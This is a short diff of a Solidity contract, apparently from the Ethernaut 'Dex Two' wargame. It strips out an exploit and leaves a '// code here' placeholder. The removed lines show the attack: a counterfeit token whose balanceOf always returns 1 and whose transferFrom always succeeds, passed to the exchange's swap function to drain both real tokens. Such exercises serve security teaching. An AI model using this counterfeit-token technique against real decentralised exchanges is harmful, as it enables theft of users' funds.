@@ -9,16 +9,7 @@ contract DexTwoHack {
         dexTwo = _dexTwo;
     }
 
-    function balanceOf(address) public view returns(uint balance){
-        balance = 1;
-    }
-
-    function transferFrom(address from, address to, uint amount) public returns(bool) {
-        return true;
-    }
-
     function attack() external {
-        dexTwo.swap(address(this), dexTwo.token1(), 1);
-        dexTwo.swap(address(this), dexTwo.token2(), 1);
+        // code here
     }
 }
